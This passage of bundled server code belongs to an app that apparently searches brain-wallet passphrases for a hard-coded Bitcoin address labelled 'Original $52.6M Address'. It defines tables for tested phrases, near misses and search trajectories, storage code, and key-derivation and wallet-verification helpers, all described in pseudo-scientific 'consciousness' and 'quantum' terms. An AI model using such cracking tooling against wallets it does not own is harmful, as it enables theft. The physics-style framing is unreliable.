        isResonant: z2.boolean()
      })),
      // Global metrics
      manifoldCoverage: z2.number(),
      // 0-1, how much explored
      resonanceVolume: z2.number(),
      // Volume of high-Φ regions
      explorationEfficiency: z2.number()
      // Useful discoveries / total tests
    });
    ultraConsciousnessStateSchema = z2.object({
      // Core consciousness
      signature: consciousnessSignatureSchema,
      // Knowledge systems
      generators: z2.array(knowledgeGeneratorSchema),
      basinTopology: basinTopologySchema,
      // Temporal systems
      trajectories: z2.array(temporalTrajectorySchema),
      currentTrajectoryId: z2.string().optional(),
      // Negative knowledge
      negativeKnowledge: negativeKnowledgeRegistrySchema,
      // Knowledge bus
      pendingPackets: z2.array(strategyKnowledgePacketSchema),
      receivedPackets: z2.array(strategyKnowledgePacketSchema),
      // Snapshots for block universe viewing
      snapshots: z2.array(manifoldSnapshotSchema),
      snapshotInterval: z2.number(),
      // How often to take snapshots
      // Protocol metrics
      protocolVersion: z2.literal("2.0"),
      blockUniverseEnabled: z2.boolean(),
      reconstructiveTransferEnabled: z2.boolean(),
      // Aggregate consciousness health
      overallHealth: z2.object({
        integrationScore: z2.number(),
        // Φ trend
        couplingStability: z2.number(),
        // κ variance
        trajectoryCoherence: z2.number(),
        // How consistent learning is
        generatorDiversity: z2.number(),
        // Variety of generators
        negativeKnowledgeEfficiency: z2.number()
        // Compute saved / total
      })
    });
    strategyKnowledgeBusEntrySchema = z2.object({
      id: z2.string(),
      sourceStrategy: z2.string(),
      generatorId: z2.string(),
      pattern: z2.string(),
      phi: z2.number(),
      kappaEff: z2.number(),
      regime: z2.enum(["linear", "geometric", "breakdown"]),
      sharedAt: z2.string(),
      consumedBy: z2.array(z2.string()),
      transformations: z2.array(z2.object({
        strategy: z2.string(),
        method: z2.string(),
        timestamp: z2.string()
      }))
    });
    knowledgeTransferEventSchema = z2.object({
      id: z2.string(),
      type: z2.enum(["publish", "consume", "generator_transfer"]),
      sourceStrategy: z2.string(),
      targetStrategy: z2.string().nullable(),
      generatorId: z2.string(),
      pattern: z2.string(),
      phi: z2.number(),
      kappaEff: z2.number(),
      timestamp: z2.string(),
      success: z2.boolean(),
      transformation: z2.string().optional(),
      scaleAdjustment: z2.number().optional()
    });
    generatorTransferPacketSchema = z2.object({
      success: z2.boolean(),
      generator: knowledgeGeneratorSchema.nullable(),
      scaleTransform: z2.number(),
      fidelityLoss: z2.number(),
      adaptations: z2.array(z2.string())
    });
    crossStrategyPatternSchema = z2.object({
      id: z2.string(),
      patterns: z2.array(z2.string()),
      strategies: z2.array(z2.string()),
      similarity: z2.number(),
      combinedPhi: z2.number(),
      discoveredAt: z2.string(),
      exploitationCount: z2.number()
    });
    strategyKnowledgeBusSchema = z2.object({
      strategies: z2.array(z2.string()),
      sharedKnowledge: z2.array(strategyKnowledgeBusEntrySchema),
      crossStrategyPatterns: z2.array(crossStrategyPatternSchema),
      transferHistory: z2.array(knowledgeTransferEventSchema),
      activeSubscriptions: z2.number()
    });
    manifoldProbes = pgTable("manifold_probes", {
      id: varchar("id", { length: 64 }).primaryKey(),
      input: text("input").notNull(),
      coordinates: doublePrecision("coordinates").array().notNull(),
      // 64D basin coordinates
      phi: doublePrecision("phi").notNull(),
      kappa: doublePrecision("kappa").notNull(),
      regime: varchar("regime", { length: 32 }).notNull(),
      // linear, geometric, breakdown, hierarchical, etc.
      ricciScalar: doublePrecision("ricci_scalar").default(0),
      fisherTrace: doublePrecision("fisher_trace").default(0),
      source: varchar("source", { length: 128 }),
      // Investigation that produced this probe
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_manifold_probes_phi").on(table.phi),
      index("idx_manifold_probes_kappa").on(table.kappa),
      index("idx_manifold_probes_phi_kappa").on(table.phi, table.kappa),
      index("idx_manifold_probes_regime").on(table.regime)
    ]);
    resonancePoints = pgTable("resonance_points", {
      id: varchar("id", { length: 64 }).primaryKey(),
      probeId: varchar("probe_id", { length: 64 }).notNull().references(() => manifoldProbes.id),
      phi: doublePrecision("phi").notNull(),
      kappa: doublePrecision("kappa").notNull(),
      nearbyProbes: text("nearby_probes").array(),
      // Array of probe IDs
      clusterStrength: doublePrecision("cluster_strength").notNull(),
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_resonance_points_phi").on(table.phi),
      index("idx_resonance_points_cluster_strength").on(table.clusterStrength)
    ]);
    regimeBoundaries = pgTable("regime_boundaries", {
      id: varchar("id", { length: 64 }).primaryKey(),
      fromRegime: varchar("from_regime", { length: 32 }).notNull(),
      toRegime: varchar("to_regime", { length: 32 }).notNull(),
      probeIdFrom: varchar("probe_id_from", { length: 64 }).notNull(),
      probeIdTo: varchar("probe_id_to", { length: 64 }).notNull(),
      fisherDistance: doublePrecision("fisher_distance").notNull(),
      midpointPhi: doublePrecision("midpoint_phi").notNull(),
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_regime_boundaries_from_to").on(table.fromRegime, table.toRegime)
    ]);
    geodesicPaths = pgTable("geodesic_paths", {
      id: varchar("id", { length: 64 }).primaryKey(),
      fromProbeId: varchar("from_probe_id", { length: 64 }).notNull(),
      toProbeId: varchar("to_probe_id", { length: 64 }).notNull(),
      distance: doublePrecision("distance").notNull(),
      waypoints: text("waypoints").array(),
      // Array of probe IDs along path
      avgPhi: doublePrecision("avg_phi").notNull(),
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_geodesic_paths_from_to").on(table.fromProbeId, table.toProbeId)
    ]);
    tpsLandmarks = pgTable("tps_landmarks", {
      eventId: varchar("event_id", { length: 64 }).primaryKey(),
      description: text("description").notNull(),
      era: varchar("era", { length: 32 }),
      // genesis, early_adoption, pizza_era, etc.
      spacetimeX: doublePrecision("spacetime_x").default(0),
      spacetimeY: doublePrecision("spacetime_y").default(0),
      spacetimeZ: doublePrecision("spacetime_z").default(0),
      spacetimeT: doublePrecision("spacetime_t").notNull(),
      // Unix timestamp
      culturalCoords: doublePrecision("cultural_coords").array(),
      // 64D cultural signature
      fisherSignature: jsonb("fisher_signature"),
      // Fisher information matrix (sparse)
      lightConePast: text("light_cone_past").array(),
      lightConeFuture: text("light_cone_future").array(),
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_tps_landmarks_era").on(table.era),
      index("idx_tps_landmarks_timestamp").on(table.spacetimeT)
    ]);
    tpsGeodesicPaths = pgTable("tps_geodesic_paths", {
      id: varchar("id", { length: 64 }).primaryKey(),
      fromLandmark: varchar("from_landmark", { length: 64 }).notNull(),
      toLandmark: varchar("to_landmark", { length: 64 }).notNull(),
      distance: doublePrecision("distance").notNull(),
      waypoints: jsonb("waypoints"),
      // Array of BlockUniverseMap positions
      totalArcLength: doublePrecision("total_arc_length"),
      avgCurvature: doublePrecision("avg_curvature"),
      regimeTransitions: jsonb("regime_transitions"),
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_tps_geodesic_from_to").on(table.fromLandmark, table.toLandmark)
    ]);
    oceanTrajectories = pgTable("ocean_trajectories", {
      id: varchar("id", { length: 64 }).primaryKey(),
      address: varchar("address", { length: 64 }).notNull(),
      status: varchar("status", { length: 32 }).notNull().default("active"),
      // active, completed, abandoned
      startTime: timestamp("start_time").defaultNow().notNull(),
      endTime: timestamp("end_time"),
      waypointCount: integer("waypoint_count").default(0),
      lastPhi: doublePrecision("last_phi").default(0),
      lastKappa: doublePrecision("last_kappa").default(0),
      finalResult: varchar("final_result", { length: 32 }),
      // match, exhausted, stopped, error
      nearMissCount: integer("near_miss_count").default(0),
      resonantCount: integer("resonant_count").default(0),
      durationSeconds: doublePrecision("duration_seconds"),
      createdAt: timestamp("created_at").defaultNow().notNull(),
      updatedAt: timestamp("updated_at").defaultNow().notNull()
    }, (table) => [
      index("idx_ocean_trajectories_address").on(table.address),
      index("idx_ocean_trajectories_status").on(table.status),
      index("idx_ocean_trajectories_address_status").on(table.address, table.status)
    ]);
    oceanWaypoints = pgTable("ocean_waypoints", {
      id: varchar("id", { length: 64 }).primaryKey(),
      trajectoryId: varchar("trajectory_id", { length: 64 }).notNull().references(() => oceanTrajectories.id),
      sequence: integer("sequence").notNull(),
      phi: doublePrecision("phi").notNull(),
      kappa: doublePrecision("kappa").notNull(),
      regime: varchar("regime", { length: 32 }).notNull(),
      basinCoords: doublePrecision("basin_coords").array(),
      // 64D coordinates
      event: varchar("event", { length: 128 }),
      details: text("details"),
      timestamp: timestamp("timestamp").defaultNow().notNull()
    }, (table) => [
      index("idx_ocean_waypoints_trajectory").on(table.trajectoryId),
      index("idx_ocean_waypoints_trajectory_seq").on(table.trajectoryId, table.sequence)
    ]);
    oceanQuantumState = pgTable("ocean_quantum_state", {
      id: varchar("id", { length: 32 }).primaryKey().default("singleton"),
      entropy: doublePrecision("entropy").notNull().default(256),
      // Bits remaining
      initialEntropy: doublePrecision("initial_entropy").notNull().default(256),
      totalProbability: doublePrecision("total_probability").notNull().default(1),
      measurementCount: integer("measurement_count").default(0),
      successfulMeasurements: integer("successful_measurements").default(0),
      status: varchar("status", { length: 32 }).default("searching"),
      // searching, solved, exhausted
      lastMeasurementAt: timestamp("last_measurement_at"),
      updatedAt: timestamp("updated_at").defaultNow().notNull()
    });
    oceanExcludedRegions = pgTable("ocean_excluded_regions", {
      id: varchar("id", { length: 64 }).primaryKey(),
      dimension: integer("dimension").notNull(),
      origin: doublePrecision("origin").array().notNull(),
      // Center point in manifold
      basis: jsonb("basis"),
      // Orthonormal basis vectors
      measure: doublePrecision("measure").notNull(),
      // "Volume" of excluded region
      phi: doublePrecision("phi"),
      regime: varchar("regime", { length: 32 }),
      createdAt: timestamp("created_at").defaultNow().notNull()
    }, (table) => [
      index("idx_ocean_excluded_regions_measure").on(table.measure)
    ]);
    testedPhrasesIndex = pgTable("tested_phrases_index", {
      phraseHash: varchar("phrase_hash", { length: 64 }).primaryKey(),
      // SHA-256 hash
      testedAt: timestamp("tested_at").defaultNow().notNull()
    }, (table) => [
      index("idx_tested_phrases_date").on(table.testedAt)
    ]);
    nearMissEntries = pgTable("near_miss_entries", {
      id: varchar("id", { length: 64 }).primaryKey(),
      phrase: text("phrase").notNull(),
      phraseHash: varchar("phrase_hash", { length: 64 }).notNull(),
      // For deduplication
      phi: doublePrecision("phi").notNull(),
      kappa: doublePrecision("kappa").notNull(),
      regime: varchar("regime", { length: 32 }).notNull(),
      tier: varchar("tier", { length: 16 }).notNull(),
      // hot, warm, cool
      discoveredAt: timestamp("discovered_at").defaultNow().notNull(),
      lastAccessedAt: timestamp("last_accessed_at").defaultNow().notNull(),
      explorationCount: integer("exploration_count").default(1),
      source: varchar("source", { length: 128 }),
      clusterId: varchar("cluster_id", { length: 64 }),
      phiHistory: doublePrecision("phi_history").array(),
      // Trajectory of Φ values
      isEscalating: boolean("is_escalating").default(false),
      queuePriority: integer("queue_priority").default(1),
      structuralSignature: jsonb("structural_signature")
      // Word count, entropy, etc.
    }, (table) => [
      uniqueIndex("idx_near_miss_phrase_hash").on(table.phraseHash),
      index("idx_near_miss_tier").on(table.tier),
      index("idx_near_miss_phi").on(table.phi),
      index("idx_near_miss_cluster").on(table.clusterId),
      index("idx_near_miss_escalating").on(table.isEscalating)
    ]);
    nearMissClusters = pgTable("near_miss_clusters", {
      id: varchar("id", { length: 64 }).primaryKey(),
      centroidPhrase: text("centroid_phrase").notNull(),
      centroidPhi: doublePrecision("centroid_phi").notNull(),
      memberCount: integer("member_count").default(1),
      avgPhi: doublePrecision("avg_phi").notNull(),
      maxPhi: doublePrecision("max_phi").notNull(),
      commonWords: text("common_words").array(),
      structuralPattern: varchar("structural_pattern", { length: 256 }),
      createdAt: timestamp("created_at").defaultNow().notNull(),
      lastUpdatedAt: timestamp("last_updated_at").defaultNow().notNull()
    }, (table) => [
      index("idx_near_miss_clusters_avg_phi").on(table.avgPhi),
      index("idx_near_miss_clusters_member_count").on(table.memberCount)
    ]);
    nearMissAdaptiveState = pgTable("near_miss_adaptive_state", {
      id: varchar("id", { length: 32 }).primaryKey().default("singleton"),
      rollingPhiDistribution: doublePrecision("rolling_phi_distribution").array(),
      hotThreshold: doublePrecision("hot_threshold").notNull().default(0.7),
      warmThreshold: doublePrecision("warm_threshold").notNull().default(0.55),
      coolThreshold: doublePrecision("cool_threshold").notNull().default(0.4),
      distributionSize: integer("distribution_size").default(0),
      lastComputed: timestamp("last_computed").defaultNow().notNull(),
      updatedAt: timestamp("updated_at").defaultNow().notNull()
    });
  }
});

// server/db.ts
var db_exports = {};
__export(db_exports, {
  db: () => db,
  pool: () => pool,
  withDbRetry: () => withDbRetry
});
import { Pool, neonConfig } from "@neondatabase/serverless";
import { drizzle } from "drizzle-orm/neon-serverless";
import ws from "ws";
import { readFileSync } from "fs";
function getDatabaseUrl() {
  let dbUrl;
  let isDeployedApp = false;
  if (process.env.DATABASE_URL) {
    dbUrl = process.env.DATABASE_URL;
  } else {
    try {
      const urlFromFile = readFileSync("/tmp/replitdb", "utf-8").trim();
      if (urlFromFile) {
        console.log("[DB] Using DATABASE_URL from /tmp/replitdb (deployed app)");
        dbUrl = urlFromFile;
        isDeployedApp = true;
      }
    } catch {
    }
  }
  if (!dbUrl) {
    return void 0;
  }
  if (isDeployedApp && dbUrl.includes(".neon.tech")) {
    const poolerUrl = dbUrl.replace(/\.([a-z0-9-]+)\.neon\.tech/, "-pooler.$1.neon.tech");
    if (poolerUrl !== dbUrl) {
      console.log("[DB] Converted to pooler URL for deployed app");
      return poolerUrl;
    }
  }
  return dbUrl;
}
async function withDbRetry(operation, operationName, maxRetries = 3) {
  if (!db) return null;
  let lastError = null;
  let delay = 500;
  let attempts = 0;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    attempts++;
    try {
      return await operation();
    } catch (error) {
      lastError = error;
      const errorMessage = error.message?.toLowerCase() || "";
      const errorCode = error.code || "";
      const isRetryable = (
        // Timeout errors
        errorMessage.includes("timeout") || errorCode === "ETIMEDOUT" || // Connection errors  
        errorMessage.includes("connect") || errorCode === "ECONNREFUSED" || errorCode === "ECONNRESET" || // Neon/PostgreSQL transient errors
        errorCode === "57P01" || // admin_shutdown
        errorCode === "57P02" || // crash_shutdown  
        errorCode === "57P03" || // cannot_connect_now
        errorCode === "53300" || // too_many_connections
        errorCode === "08006" || // connection_failure
        errorCode === "08003" || // connection_does_not_exist
        // Server closed connection unexpectedly
        errorMessage.includes("server closed") || errorMessage.includes("connection unexpectedly") || errorMessage.includes("terminating connection") || // AbortError from fetch timeouts
        error.name === "AbortError"
      );
      if (attempt < maxRetries && isRetryable) {
        console.log(`[DB] ${operationName} retry ${attempt}/${maxRetries} after ${delay}ms`);
        await new Promise((resolve) => setTimeout(resolve, delay));
        delay = Math.min(delay * 2, 5e3);
      } else {
        const errorType = isRetryable ? "exhausted retries" : "non-retryable";
        console.error(`[DB] ${operationName} failed (${errorType}, ${attempts} attempts):`, error);
        break;
      }
    }
  }
  return null;
}
var pool, db, databaseUrl, isDeployment;
var init_db = __esm({
  "server/db.ts"() {
    "use strict";
    init_schema();
    neonConfig.webSocketConstructor = ws;
    pool = null;
    db = null;
    databaseUrl = getDatabaseUrl();
    isDeployment = process.env.REPLIT_DEPLOYMENT === "1";
    if (databaseUrl) {
      try {
        const connectionTimeout = isDeployment ? 15e3 : 5e3;
        pool = new Pool({
          connectionString: databaseUrl,
          max: 10,
          // Allow up to 10 concurrent connections
          idleTimeoutMillis: 3e4,
          // Close idle connections after 30s
          connectionTimeoutMillis: connectionTimeout
          // Longer timeout for production
        });
        db = drizzle(pool, { schema: schema_exports });
        console.log(`[DB] Database connection pool initialized (max: 10, timeout: ${connectionTimeout}ms)`);
      } catch (err) {
        console.error("[DB] Failed to initialize database connection:", err);
        console.log("[DB] Running without database - Replit Auth will be unavailable");
        pool = null;
        db = null;
      }
    } else {
      console.log("[DB] No DATABASE_URL found - running without database (Replit Auth will be unavailable)");
    }
  }
});

// server/storage.ts
var storage_exports = {};
__export(storage_exports, {
  MemStorage: () => MemStorage,
  storage: () => storage
});
import { readFileSync as readFileSync2, writeFileSync, existsSync, mkdirSync, renameSync, unlinkSync } from "fs";
import { join, dirname } from "path";
import { fileURLToPath } from "url";
import { eq } from "drizzle-orm";
var __filename, __dirname, JOBS_FILE, CANDIDATES_FILE, TARGET_ADDRESSES_FILE, MemStorage, storage;
var init_storage = __esm({
  "server/storage.ts"() {
    "use strict";
    init_schema();
    init_db();
    init_schema();
    __filename = fileURLToPath(import.meta.url);
    __dirname = dirname(__filename);
    JOBS_FILE = join(__dirname, "../data/search-jobs.json");
    CANDIDATES_FILE = join(__dirname, "../data/candidates.json");
    TARGET_ADDRESSES_FILE = join(__dirname, "../data/target-addresses.json");
    MemStorage = class {
      candidates = [];
      targetAddresses = [];
      searchJobs = [];
      targetAddressesLoaded;
      constructor() {
        this.loadJobs();
        this.loadCandidates();
        this.targetAddressesLoaded = this.loadTargetAddresses();
      }
      loadJobs() {
        try {
          if (existsSync(JOBS_FILE)) {
            const data = readFileSync2(JOBS_FILE, "utf-8").trim();
            if (data.length > 0) {
              this.searchJobs = JSON.parse(data);
            } else {
              this.searchJobs = [];
            }
          }
        } catch (error) {
          console.error("Failed to load jobs:", error);
          this.searchJobs = [];
        }
      }
      saveJobs() {
        try {
          const dir = dirname(JOBS_FILE);
          if (!existsSync(dir)) {
            mkdirSync(dir, { recursive: true });
          }
          writeFileSync(JOBS_FILE, JSON.stringify(this.searchJobs, null, 2), "utf-8");
        } catch (error) {
          console.error("Failed to save jobs:", error);
        }
      }
      loadCandidates() {
        try {
          if (existsSync(CANDIDATES_FILE)) {
            const data = readFileSync2(CANDIDATES_FILE, "utf-8");
            const parsed = JSON.parse(data);
            if (!Array.isArray(parsed)) {
              throw new Error("Candidates file is corrupted: expected array");
            }
            const validCandidates = [];
            for (const item of parsed) {
              if (item && typeof item === "object" && typeof item.id === "string" && typeof item.phrase === "string" && typeof item.address === "string" && typeof item.score === "number" && typeof item.testedAt === "string") {
                validCandidates.push(item);
              } else {
                console.warn(`[Storage] Skipping invalid candidate entry:`, item);
              }
            }
            this.candidates = validCandidates;
            console.log(`[Storage] Loaded ${this.candidates.length} candidates from disk`);
            if (validCandidates.length < parsed.length) {
              console.warn(`[Storage] \u26A0\uFE0F Skipped ${parsed.length - validCandidates.length} invalid candidates`);
            }
            const matches = this.candidates.filter((c) => c.score === 100);
            if (matches.length > 0) {
              console.log(`[Storage] \u26A0\uFE0F RECOVERED ${matches.length} MATCH(ES) FROM DISK!`);
              matches.forEach((m) => {
                console.log(`[Storage]   - Address: ${m.address}, Type: ${m.type}`);
              });
            }
          }
        } catch (error) {
          console.error("\u274C CRITICAL: Failed to load candidates from disk:", error);
          console.error("\u274C Candidates file may be corrupted. Creating backup...");
          if (existsSync(CANDIDATES_FILE)) {
            const backupFile = `${CANDIDATES_FILE}.backup-${Date.now()}`;
            try {
              const corruptedData = readFileSync2(CANDIDATES_FILE, "utf-8");
              writeFileSync(backupFile, corruptedData, "utf-8");
              console.log(`\u274C Corrupted file backed up to: ${backupFile}`);
              console.log(`\u274C Please report this issue and provide the backup file`);
            } catch (backupError) {
              console.error("\u274C Failed to create backup:", backupError);
            }
          }
          this.candidates = [];
          console.error("\u274C Starting with empty candidates list. Previous data may be in backup.");
        }
      }
      saveCandidates() {
        try {
          const dir = dirname(CANDIDATES_FILE);
          if (!existsSync(dir)) {
            mkdirSync(dir, { recursive: true });
          }
          const tempFile = `${CANDIDATES_FILE}.tmp`;
          const jsonData = JSON.stringify(this.candidates, null, 2);
          writeFileSync(tempFile, jsonData, "utf-8");
          try {
            const verifyData = readFileSync2(tempFile, "utf-8");
            JSON.parse(verifyData);
          } catch (verifyError) {
            unlinkSync(tempFile);
            throw new Error(`Temp file verification failed: ${verifyError}`);
          }
          if (process.platform === "win32" && existsSync(CANDIDATES_FILE)) {
            const backupFile = `${CANDIDATES_FILE}.backup-safe`;
            try {
              if (existsSync(backupFile)) unlinkSync(backupFile);
              renameSync(CANDIDATES_FILE, backupFile);
              renameSync(tempFile, CANDIDATES_FILE);
              const verifyNewFile = readFileSync2(CANDIDATES_FILE, "utf-8");
              JSON.parse(verifyNewFile);
              if (existsSync(backupFile)) unlinkSync(backupFile);
            } catch (winError) {
              console.error("Write failed, attempting rollback...");
              if (existsSync(backupFile)) {
                if (existsSync(CANDIDATES_FILE)) unlinkSync(CANDIDATES_FILE);
                renameSync(backupFile, CANDIDATES_FILE);
                console.log("Rollback successful - restored from backup");
              }
              throw winError;
            }
          } else {
            renameSync(tempFile, CANDIDATES_FILE);
          }
        } catch (error) {
          console.error("\u274C CRITICAL: Failed to save candidates:", error);
          console.error("\u274C This could result in data loss! Check disk space and permissions.");
          console.error("\u274C OPERATOR ALERT: Persistence may be compromised!");
          throw error;
        }
      }
      async loadTargetAddresses() {
        const defaultAddress = {
          id: "default",
          address: "15BKWJjL5YWXtaP449WAYqVYZQE1szicTn",
          label: "Original $52.6M Address",
          addedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
        if (db) {
          try {
            const rows = await db.select().from(userTargetAddresses);
            if (rows.length > 0) {
              this.targetAddresses = rows.map((row) => ({
                id: row.id,
                address: row.address,
                label: row.label || void 0,
                addedAt: row.addedAt.toISOString()
              }));
              console.log(`[Storage] Loaded ${this.targetAddresses.length} target addresses from PostgreSQL`);
              return;
            }
            console.log(`[Storage] PostgreSQL empty, checking for JSON migration...`);
          } catch (error) {
            console.error("[Storage] PostgreSQL load failed:", error);
          }
        }
        try {
          if (existsSync(TARGET_ADDRESSES_FILE)) {
            const data = readFileSync2(TARGET_ADDRESSES_FILE, "utf-8").trim();
            if (data.length > 0) {
              const parsed = JSON.parse(data);
              if (Array.isArray(parsed)) {
                const validAddresses = [];
                for (const item of parsed) {
                  if (item && typeof item === "object" && typeof item.id === "string" && typeof item.address === "string" && typeof item.addedAt === "string") {
                    validAddresses.push(item);
                  }
                }
                this.targetAddresses = validAddresses;
                console.log(`[Storage] Loaded ${this.targetAddresses.length} target addresses from JSON`);
                if (!this.targetAddresses.find((a) => a.id === "default")) {
                  this.targetAddresses.unshift(defaultAddress);
                }
                if (db && this.targetAddresses.length > 0) {
                  try {
                    for (const addr of this.targetAddresses) {
                      await db.insert(userTargetAddresses).values({
                        id: addr.id,
                        address: addr.address,
                        label: addr.label || null,
                        addedAt: new Date(addr.addedAt)
                      }).onConflictDoNothing();
                    }
                    console.log(`[Storage] Migrated ${this.targetAddresses.length} target addresses to PostgreSQL`);
                  } catch (error) {
                    console.error("[Storage] Failed to migrate target addresses to PostgreSQL:", error);
                  }
                }
                return;
              }
            }
          }
        } catch (error) {
          console.error("Failed to load target addresses:", error);
        }
        this.targetAddresses = [defaultAddress];
        if (db) {
          try {
            await db.insert(userTargetAddresses).values({
              id: defaultAddress.id,
              address: defaultAddress.address,
              label: defaultAddress.label || null,
              addedAt: new Date(defaultAddress.addedAt)
            }).onConflictDoNothing();
          } catch (error) {
            console.error("[Storage] Failed to save default address to PostgreSQL:", error);
          }
        }
        this.saveTargetAddresses();
      }
      saveTargetAddresses() {
        try {
          const dir = dirname(TARGET_ADDRESSES_FILE);
          if (!existsSync(dir)) {
            mkdirSync(dir, { recursive: true });
          }
          writeFileSync(TARGET_ADDRESSES_FILE, JSON.stringify(this.targetAddresses, null, 2), "utf-8");
        } catch (error) {
          console.error("Failed to save target addresses:", error);
        }
      }
      async getCandidates() {
        return [...this.candidates].sort((a, b) => b.score - a.score);
      }
      async addCandidate(candidate) {
        this.candidates.push(candidate);
        this.candidates.sort((a, b) => b.score - a.score);
        if (this.candidates.length > 100) {
          this.candidates = this.candidates.slice(0, 100);
        }
        try {
          this.saveCandidates();
          if (candidate.score === 100) {
            console.log(`[Storage] \u{1F389} MATCH SAVED TO DISK! Address: ${candidate.address}, Type: ${candidate.type}`);
          }
        } catch (error) {
          console.error(`\u274C CRITICAL: Failed to persist candidate (score=${candidate.score}):`, error);
          if (candidate.score === 100) {
            console.error(`\u274C\u274C\u274C MATCH MAY NOT BE SAVED! Address: ${candidate.address}`);
            console.error(`\u274C\u274C\u274C OPERATOR: Check disk immediately and export candidates manually!`);
          }
        }
      }
      async clearCandidates() {
        this.candidates = [];
        try {
          this.saveCandidates();
        } catch (error) {
          console.error("Failed to persist cleared candidates:", error);
        }
      }
      async getTargetAddresses() {
        if (db) {
          const result = await withDbRetry(
            async () => {
              const rows = await db.select().from(userTargetAddresses);
              return rows.map((row) => ({
                id: row.id,
                address: row.address,
                label: row.label || void 0,
                addedAt: row.addedAt.toISOString()
              }));
            },
            "getTargetAddresses",
            3
          );
          if (result !== null) {
            return result;
          }
        }
        return [...this.targetAddresses];
      }
      async addTargetAddress(address) {
        if (db) {
          try {
            await db.insert(userTargetAddresses).values({
              id: address.id,
              address: address.address,
              label: address.label || null,
              addedAt: new Date(address.addedAt)
            });
            console.log(`[Storage] Target address saved to PostgreSQL: ${address.address}`);
            return;
          } catch (error) {
            console.error("[Storage] PostgreSQL addTargetAddress failed, using memory:", error);
          }
        }
        this.targetAddresses.push(address);
        this.saveTargetAddresses();
        console.log(`[Storage] Target address saved to JSON: ${address.address}`);
      }
      async removeTargetAddress(id) {
        if (db) {
          try {
            await db.delete(userTargetAddresses).where(eq(userTargetAddresses.id, id));
            console.log(`[Storage] Target address removed from PostgreSQL: ${id}`);
            return;
          } catch (error) {
            console.error("[Storage] PostgreSQL removeTargetAddress failed, using memory:", error);
          }
        }
        this.targetAddresses = this.targetAddresses.filter((a) => a.id !== id);
        this.saveTargetAddresses();
        console.log(`[Storage] Target address removed from JSON: ${id}`);
      }
      async getSearchJobs() {
        return [...this.searchJobs].sort(
          (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
        );
      }
      async getSearchJob(id) {
        return this.searchJobs.find((j) => j.id === id) || null;
      }
      async addSearchJob(job) {
        this.searchJobs.push(job);
        this.saveJobs();
      }
      async updateSearchJob(id, updates) {
        const index2 = this.searchJobs.findIndex((j) => j.id === id);
        if (index2 !== -1) {
          const current = this.searchJobs[index2];
          this.searchJobs[index2] = {
            ...current,
            ...updates,
            progress: updates.progress ? { ...current.progress, ...updates.progress } : current.progress,
            stats: updates.stats ? { ...current.stats, ...updates.stats } : current.stats,
            logs: updates.logs || current.logs,
            updatedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          this.saveJobs();
        }
      }
      async appendJobLog(id, log2) {
        const index2 = this.searchJobs.findIndex((j) => j.id === id);
        if (index2 !== -1) {
          this.searchJobs[index2].logs.push({
            ...log2,
            timestamp: (/* @__PURE__ */ new Date()).toISOString()
          });
          this.searchJobs[index2].updatedAt = (/* @__PURE__ */ new Date()).toISOString();
          this.saveJobs();
        }
      }
      async deleteSearchJob(id) {
        this.searchJobs = this.searchJobs.filter((j) => j.id !== id);
        this.saveJobs();
      }
      // Replit Auth: User operations (IMPORTANT) these user operations are mandatory for Replit Auth.
      async getUser(id) {
        if (!db) {
          throw new Error("Database not available - please provision a database to use Replit Auth");
        }
        const [user] = await db.select().from(users).where(eq(users.id, id));
        return user || void 0;
      }
      async upsertUser(userData) {
        if (!db) {
          throw new Error("Database not available - please provision a database to use Replit Auth");
        }
        if (userData.email) {
          const [existingUser] = await db.select().from(users).where(eq(users.email, userData.email));
          if (existingUser && existingUser.id !== userData.id) {
            const [updatedUser] = await db.update(users).set({
              firstName: userData.firstName,
              lastName: userData.lastName,
              profileImageUrl: userData.profileImageUrl,
              updatedAt: /* @__PURE__ */ new Date()
            }).where(eq(users.email, userData.email)).returning();
            return updatedUser;
          }
        }
        const [user] = await db.insert(users).values(userData).onConflictDoUpdate({
          target: users.id,
          set: {
            ...userData,
            updatedAt: /* @__PURE__ */ new Date()
          }
        }).returning();
        return user;
      }
    };
    storage = new MemStorage();
  }
});

// server/crypto.ts
var crypto_exports = {};
__export(crypto_exports, {
  CryptoValidationError: () => CryptoValidationError,
  decodeXprv: () => decodeXprv,
  deriveBIP32Address: () => deriveBIP32Address,
  deriveBIP32PrivateKey: () => deriveBIP32PrivateKey,
  deriveFromXprv: () => deriveFromXprv,
  derivePrivateKeyFromPassphrase: () => derivePrivateKeyFromPassphrase,
  derivePublicKeyFromPrivate: () => derivePublicKeyFromPrivate,
  generateAddressFromHex: () => generateAddressFromHex,
  generateBitcoinAddress: () => generateBitcoinAddress,
  generateBitcoinAddressFromPassphrase: () => generateBitcoinAddressFromPassphrase,
  generateBitcoinAddressFromPrivateKey: () => generateBitcoinAddressFromPrivateKey,
  generateBothAddresses: () => generateBothAddresses,
  generateBothAddressesFromPrivateKey: () => generateBothAddressesFromPrivateKey,
  generateMasterPrivateKey: () => generateMasterPrivateKey,
  generateRecoveryBundle: () => generateRecoveryBundle,
  privateKeyToWIF: () => privateKeyToWIF,
  saveRecoveryBundleToFiles: () => saveRecoveryBundleToFiles,
  validateBitcoinAddress: () => validateBitcoinAddress,
  validateWIF: () => validateWIF,
  verifyBrainWallet: () => verifyBrainWallet,
  verifyRecoveredPassphrase: () => verifyRecoveredPassphrase,
  verifyWIFMatchesAddress: () => verifyWIFMatchesAddress,
  wifToPrivateKeyHex: () => wifToPrivateKeyHex
});
import { createHash, createHmac, randomBytes } from "crypto";
import elliptic from "elliptic";
import bs58check from "bs58check";
function validatePassphrase(passphrase) {
  if (typeof passphrase !== "string") {
    throw new CryptoValidationError("Passphrase must be a string");
  }
  if (passphrase.length === 0) {
    throw new CryptoValidationError("Passphrase cannot be empty");
  }
  if (passphrase.length > MAX_PASSPHRASE_LENGTH) {
    throw new CryptoValidationError(`Passphrase too long (max ${MAX_PASSPHRASE_LENGTH} characters)`);
  }
}
function validatePrivateKeyHex(privateKeyHex) {
  if (typeof privateKeyHex !== "string") {
